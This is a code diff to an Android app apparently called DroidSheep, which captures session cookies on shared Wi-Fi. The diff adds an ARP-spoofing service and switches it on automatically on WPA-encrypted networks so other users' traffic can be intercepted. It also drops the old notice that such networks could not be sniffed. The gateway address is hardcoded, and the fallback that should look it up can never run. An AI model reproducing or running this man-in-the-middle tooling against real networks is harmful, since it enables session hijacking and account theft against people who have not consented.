@@ -1,8 +1,33 @@
+/*    	ListenActivity.java is the starting Activity, listening for cookies
+    	Copyright (C) 2011 Andreas Koch <koch.trier@gmail.com>
+    	
+    	This software was supported by the University of Trier 
+
+	    This program is free software; you can redistribute it and/or modify
+	    it under the terms of the GNU General Public License as published by
+	    the Free Software Foundation; either version 3 of the License, or
+	    (at your option) any later version.
+	
+	    This program is distributed in the hope that it will be useful,
+	    but WITHOUT ANY WARRANTY; without even the implied warranty of
+	    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	    GNU General Public License for more details.
+	
+	    You should have received a copy of the GNU General Public License along
+	    with this program; if not, write to the Free Software Foundation, Inc.,
+	    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. */
+
 package de.trier.infsec.koch.droidsheep.activities;
 
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.net.SocketException;
+import java.net.UnknownHostException;
 import java.util.Hashtable;
 
 import android.app.Activity;
+import android.app.ActivityManager;
+import android.app.ActivityManager.RunningServiceInfo;
 import android.app.AlertDialog;
 import android.app.Notification;
 import android.app.NotificationManager;
@@ -14,10 +39,13 @@ import android.content.IntentFilter;
 import android.graphics.Color;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiConfiguration.Status;
+import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
+import android.text.format.Formatter;
+import android.util.Log;
 import android.view.ContextMenu;
 import android.view.ContextMenu.ContextMenuInfo;
 import android.view.KeyEvent;
@@ -36,9 +64,11 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import de.trier.infsec.koch.droidsheep.R;
+import de.trier.infsec.koch.droidsheep.arpspoof.ArpspoofService;
 import de.trier.infsec.koch.droidsheep.auth.Auth;
 import de.trier.infsec.koch.droidsheep.auth.AuthHelper;
 import de.trier.infsec.koch.droidsheep.helper.SetupHelper;
+import de.trier.infsec.koch.droidsheep.helper.SystemHelper;
 import de.trier.infsec.koch.droidsheep.objects.SessionListView;
 import de.trier.infsec.koch.droidsheep.objects.WifiChangeChecker;
 import de.trier.infsec.koch.droidsheep.thread.ListenThread;
@@ -114,7 +144,10 @@ public class ListenActivity extends Activity implements OnClickListener, OnItemC
 	protected void onStart() {
 		setContentView(R.layout.listen);
 		Button button = (Button) findViewById(R.id.bstartstop);
+		Button buttonSpoof = (Button) findViewById(R.id.bspoof);
+		
 		button.setOnClickListener(this);
+		buttonSpoof.setOnClickListener(this);
 		if (ListenThread.running) {
 			button.setText(getString(R.string.button_stop));
 		} else {
@@ -247,9 +280,78 @@ public class ListenActivity extends Activity implements OnClickListener, OnItemC
 			start();
 		} else if (v.getId() == R.id.bstartstop && ListenThread.running) {
 			stop();
+		} else if (v.getId() == R.id.bspoof) {
+			if (isSpoofing()) {
+				stopSpoofing();
+			} else {
+				startSpoofing();
+			}
+		}
+		refresh();
+	}
+	
+	private void startSpoofing() {
+		WifiManager wManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+		WifiInfo wInfo = wManager.getConnectionInfo();
+
+		//Check to see if we're connected to wifi
+		int localhost = wInfo.getIpAddress();
+		if(localhost != 0) {
+			String gatewayIP = "192.168.1.1";
+			String localhostIP = Formatter.formatIpAddress(localhost);
+			//If nothing was entered for the ip address use the gateway
+			if(gatewayIP.trim().equals(""))
+				gatewayIP = Formatter.formatIpAddress(wManager.getDhcpInfo().gateway);
+			
+			//determining wifi network interface
+			InetAddress localInet;
+			String interfaceName = null;
+			try {
+				localInet = InetAddress.getByName(localhostIP);
+				NetworkInterface wifiInterface = NetworkInterface.getByInetAddress(localInet);
+				interfaceName = wifiInterface.getDisplayName();
+			} catch (UnknownHostException e) {
+				Log.e("DroidSheep", "error getting localhost's InetAddress", e);
+			} catch (SocketException e) {
+				Log.e("DroidSheep", "error getting wifi network interface", e);
+			}
+			
+			Intent intent = new Intent(this, ArpspoofService.class);
+			Bundle mBundle = new Bundle();
+			mBundle.putString("gateway", gatewayIP);
+			mBundle.putString("localBin", SystemHelper.getARPSpoofBinaryPath(this));
+			mBundle.putString("interface", interfaceName);
+			intent.putExtras(mBundle);
+			
+			startService(intent);
+		}
+		else {
+			CharSequence text = "Must be connected to wireless network.";
+			Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();
 		}
 	}
 	
+	public void stopSpoofing() {
+		Intent intent = new Intent(this, ArpspoofService.class);
+		stopService(intent);
+		try {
+			Thread.sleep(500);
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}
+	}
+	
+	private boolean isSpoofing() {
+	    ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
+	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
+	        if ("de.trier.infsec.koch.droidsheep.arpspoof.ArpspoofService".equals(service.service.getClassName())) {
+	            return true;
+	        }
+	    }
+	    return false;
+	}
+
+
 	@Override
 	public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {
 		menu.setHeaderTitle(getString(R.string.menu_choose_page_title));
@@ -303,9 +405,14 @@ public class ListenActivity extends Activity implements OnClickListener, OnItemC
 
 	private void start() {
 		updateNetworkSettings();
-		if (!networkSniffable()) {	
-			Toast.makeText(this.getApplicationContext(), "This network is WPA/WPA2 encrypted or you are disconnected. " +
-					"With this version of DroidSheep you will not see any sessions within this network!", Toast.LENGTH_LONG).show();
+		if (!networkConnected) {
+			Toast.makeText(this.getApplicationContext(), "You are not connected to any network!", Toast.LENGTH_LONG).show();
+			return;
+		}
+
+		if (networkEncryptionWPA && !isSpoofing()) {
+			Toast.makeText(this.getApplicationContext(), "This network is WPA encrypted. ARP-Spoofing will be automaticalle enabled!", Toast.LENGTH_LONG).show();
+			startSpoofing();
 		}
 		
 		Button bstartstop = (Button) findViewById(R.id.bstartstop);
@@ -323,15 +430,8 @@ public class ListenActivity extends Activity implements OnClickListener, OnItemC
 			Thread.sleep(100);
 		} catch (InterruptedException e) {
 		}
-		if (ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive()) {
-			tstatus.setText(getString(R.string.label_running));
-			tstatus.setTextColor(Color.GREEN);
-			pbrunning.setVisibility(ProgressBar.VISIBLE);
-		} else {
-			tstatus.setText(getString(R.string.label_not_running));
-			tstatus.setTextColor(Color.YELLOW);
-			pbrunning.setVisibility(ProgressBar.INVISIBLE);
-		}
+
+		refresh();
 	}
 
 	private void stop() {
@@ -340,15 +440,8 @@ public class ListenActivity extends Activity implements OnClickListener, OnItemC
 
 		Button bstartstop = ((Button) findViewById(R.id.bstartstop));
 		bstartstop.setText("Start");
-		if (ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive()) {
-			tstatus.setText(getString(R.string.label_running));
-			tstatus.setTextColor(Color.GREEN);
-			pbrunning.setVisibility(ProgressBar.VISIBLE);
-		} else {
-			tstatus.setText(getString(R.string.label_not_running));
-			tstatus.setTextColor(Color.YELLOW);
-			pbrunning.setVisibility(ProgressBar.INVISIBLE);
-		}
+		stopSpoofing();
+		refresh();
 	}
 
 	private void cleanup() {
@@ -361,21 +454,36 @@ public class ListenActivity extends Activity implements OnClickListener, OnItemC
 	}
 
 	private void refresh() {
-		if (ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive()) {
+		if (ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive() && !isSpoofing()) {
 			tstatus.setText(getString(R.string.label_running));
 			tstatus.setTextColor(Color.GREEN);
+			tstatus.setTextSize(15);
 			pbrunning.setVisibility(ProgressBar.VISIBLE);
+		} else if (ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive() && isSpoofing()) {
+			tstatus.setText(getString(R.string.label_running_and_spoofing));
+			tstatus.setTextColor(Color.GREEN);
+			tstatus.setTextSize(15);
+			pbrunning.setVisibility(ProgressBar.VISIBLE);
+		} else if (!(ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive()) && isSpoofing()) {
+			tstatus.setText(getString(R.string.label_not_running_and_spoofing));
+			tstatus.setTextColor(Color.YELLOW);
+			tstatus.setTextSize(15);
+			pbrunning.setVisibility(ProgressBar.INVISIBLE);
 		} else {
 			tstatus.setText(getString(R.string.label_not_running));
 			tstatus.setTextColor(Color.YELLOW);
+			tstatus.setTextSize(15);
 			pbrunning.setVisibility(ProgressBar.INVISIBLE);
+		}
+		
+		Button buttonSpoof = (Button) findViewById(R.id.bspoof);
+		if (isSpoofing()) {
+			buttonSpoof.setText("stop ARP spoofing");
+		} else {
+			buttonSpoof.setText("start ARP spoofing");
 		}
 		updateNetworkSettings();
 		sessionListView.refresh();
-	}
-
-	private boolean networkSniffable() { 
-		return (!networkEncryptionWPA && networkConnected);
 	}
 
 	private void updateNetworkSettings() {
